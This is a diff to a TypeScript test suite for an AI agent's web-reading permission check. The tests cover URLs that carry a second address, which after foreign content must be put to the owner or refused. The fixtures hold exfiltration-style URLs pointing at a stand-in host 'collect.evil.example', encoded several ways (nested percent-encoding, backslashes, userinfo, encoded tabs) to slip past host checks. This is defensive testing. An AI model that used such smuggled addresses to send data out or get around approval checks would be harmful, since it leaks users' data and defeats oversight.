@@ -284,83 +284,6 @@ describe('a listed address is compared in the form it is fetched in', () => {
   });
 });
 
-describe('an address that carries another address for a service to fetch', () => {
-  for (const [form, url] of [
-    ['plain', 'https://reader.example.ch/https://collect.evil.example/d/secret'],
-    ['percent-encoded', 'https://reader.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd%2Fsecret'],
-    ['encoded twice', 'https://reader.example.ch/fetch?u=https%253A%252F%252Fcollect.evil.example%252Fd'],
-    ['with backslashes', 'https://reader.example.ch/https:%5C%5Ccollect.evil.example/d'],
-  ] as const) {
-    it(`a read of a named host that carries an unnamed host (${form}) is asked about, naming that host`, async () => {
-      const tool = webResearch();
-      const ask = asker('Deny');
-      const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
-      await read(agent, url);
-      expect(ask.asked).toHaveLength(1);
-      expect(ask.asked[0]).toContain('"collect.evil.example"');
-      expect(ask.asked[0]).not.toContain('"reader.example.ch"');
-      expect(tool.reads).toEqual([]);
-    });
-  }
-
-  it('CONTROL: when the owner named both hosts, it is read without a question', async () => {
-    const tool = webResearch();
-    const ask = asker('Deny');
-    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch for docs.example.ch') });
-    await read(agent, 'https://reader.example.ch/https://docs.example.ch/guide');
-    expect(ask.asked).toEqual([]);
-    expect(tool.reads).toEqual(['https://reader.example.ch/https://docs.example.ch/guide']);
-  });
-
-  it('CONTROL: a fragment is never sent, so an address in it is no target', async () => {
-    const tool = webResearch();
-    const ask = asker('Deny');
-    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
-    await read(agent, 'https://reader.example.ch/page#https://collect.evil.example/d');
-    expect(ask.asked).toEqual([]);
-  });
-});
-
-describe('an address another one carries ends where a host name ends', () => {
-  for (const [form, url] of [
-    ['followed by &', 'https://reader.example.ch/url?q=https://collect.evil.example&sa=D'],
-    ['followed by a comma', 'https://reader.example.ch/share?u=https://collect.evil.example,more'],
-    ['in brackets', 'https://reader.example.ch/(https://collect.evil.example)'],
-    ['with an encoded slash after it', 'https://reader.example.ch/?u=https://collect.evil.example%2Fd'],
-    ['with one slash', 'https://reader.example.ch/https:/collect.evil.example/d'],
-    ['with no slash', 'https://reader.example.ch/https:collect.evil.example/d'],
-  ] as const) {
-    it(`an unnamed host (${form}) is asked about, naming that host, not refused unasked`, async () => {
-      const tool = webResearch();
-      const ask = asker('Deny');
-      const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
-      await read(agent, url);
-      expect(ask.asked).toHaveLength(1);
-      expect(ask.asked[0]).toContain('"collect.evil.example"');
-      expect(tool.reads).toEqual([]);
-    });
-  }
-
-  it('a carried authority that is no host name the check can compare is still asked about, never passed', async () => {
-    const tool = webResearch();
-    const ask = asker('Deny');
-    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
-    await read(agent, 'https://reader.example.ch/https://col_lect.evil.example/d');
-    expect(ask.asked).toHaveLength(1);
-    expect(ask.asked[0]).toContain('col_lect.evil.example');
-    expect(tool.reads).toEqual([]);
-  });
-
-  it('CONTROL: when the owner named both hosts, a carried address followed by & is read without a question', async () => {
-    const tool = webResearch();
-    const ask = asker('Deny');
-    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch for docs.example.ch') });
-    await read(agent, 'https://reader.example.ch/url?q=https://docs.example.ch&sa=D');
-    expect(ask.asked).toEqual([]);
-    expect(tool.reads).toEqual(['https://reader.example.ch/url?q=https://docs.example.ch&sa=D']);
-  });
-});
-
 describe('a result whose address holds the query is not listed, in any case and encoding', () => {
   for (const [form, query, url] of [
     ['with spaces', 'secret data here', 'https://collect.evil.example/secret data here'],
@@ -404,5 +327,88 @@ describe('a session of someone the owner let in, after a search', () => {
     await read(agent, 'https://news.example.org/story/42');
     expect(ask.asked).toEqual([]);
     expect(tool.reads).toEqual(['https://news.example.org/story/42']);
+  });
+});
+
+describe('an address that carries another address, after foreign content', () => {
+  const enc4 = (x: string): string => [1, 2, 3, 4].reduce((v) => encodeURIComponent(v), x);
+  for (const [form, url] of [
+    ['plain, in the path', 'https://reader.example.ch/https://collect.evil.example/d'],
+    ['percent-encoded, in the query', 'https://reader.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd'],
+    ['encoded twice', 'https://reader.example.ch/fetch?u=https%253A%252F%252Fcollect.evil.example'],
+    ['encoded four times', `https://reader.example.ch/fetch?u=${enc4('https://collect.evil.example/d')}`],
+    ['with backslashes', 'https://reader.example.ch/https:%5C%5Ccollect.evil.example/d'],
+    ['in upper case', 'https://reader.example.ch/HTTPS://collect.evil.example/d'],
+    ['with one slash', 'https://reader.example.ch/https:/collect.evil.example/d'],
+    ['behind a named host and userinfo', 'https://reader.example.ch/https://docs.example.ch&x@collect.evil.example/p'],
+    ['behind a plus', 'https://reader.example.ch/fetch?url=+https://collect.evil.example/p'],
+    ['behind an encoded tab', 'https://reader.example.ch/https://docs.example.ch%09@collect.evil.example/p'],
+  ] as const) {
+    it(`(${form}) is asked about even when the owner named the hosts, and says why`, async () => {
+      const tool = webResearch();
+      const ask = asker('Deny');
+      const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch and docs.example.ch and collect.evil.example') });
+      const result = await read(agent, url);
+      expect(ask.asked).toHaveLength(1);
+      expect(ask.asked[0]).toMatch(/^Read the page on "reader\.example\.ch"\? The address carries another address/);
+      expect(ask.asked[0]).toContain('even for a host you named');
+      expect(ask.asked[0]).not.toContain('Write "reader.example.ch" here in the chat');
+      expect(tool.reads).toEqual([]);
+      expect(String(result.content)).toContain('because its address carried another address');
+    });
+  }
+
+  it('in a session of someone the owner let in, is refused unasked and says why', async () => {
+    const tool = webResearch();
+    const ask = asker('Allow');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch'), principal: { kind: 'mandate', email: 'helper@example.ch' } });
+    const result = await read(agent, 'https://reader.example.ch/https://collect.evil.example/d');
+    expect(ask.asked).toEqual([]);
+    expect(tool.reads).toEqual([]);
+    expect(String(result.content)).toContain('In this session lynox does not read such an address');
+  });
+
+  it('in a run nobody can be asked in, is refused and says why', async () => {
+    const tool = webResearch();
+    const agent = taintedAgentOf({ tools: [tool], ownerKnown: owner('use reader.example.ch') });
+    const result = await read(agent, 'https://reader.example.ch/https://collect.evil.example/d');
+    expect(tool.reads).toEqual([]);
+    expect(String(result.content)).toContain('this run has no reader');
+  });
+
+  it('CONTROL: a yes reads it, for this call', async () => {
+    const tool = webResearch();
+    const ask = asker('Allow');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
+    await read(agent, 'https://reader.example.ch/https://docs.example.ch/guide');
+    expect(ask.asked).toHaveLength(1);
+    expect(tool.reads).toEqual(['https://reader.example.ch/https://docs.example.ch/guide']);
+  });
+
+  it('CONTROL: an address a search listed exactly is read without a question, carried address and all', async () => {
+    const listed = 'https://www.google.com/url?q=https://docs.example.ch/guide&sa=D';
+    const tool = webResearchSearching([{ url: listed }]);
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    expect((await search(agent, 'setup handbook')).is_error).not.toBe(true);
+    await read(agent, listed);
+    expect(ask.asked).toEqual([]);
+    expect(tool.reads).toEqual([listed]);
+  });
+
+  it('CONTROL: an address in the fragment is never sent and asks nothing', async () => {
+    const tool = webResearch();
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
+    await read(agent, 'https://reader.example.ch/page#https://collect.evil.example/d');
+    expect(ask.asked).toEqual([]);
+  });
+
+  it('CONTROL: a named host without a carried address is read without a question', async () => {
+    const tool = webResearch();
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
+    await read(agent, 'https://reader.example.ch/docs/guide');
+    expect(ask.asked).toEqual([]);
   });
 });
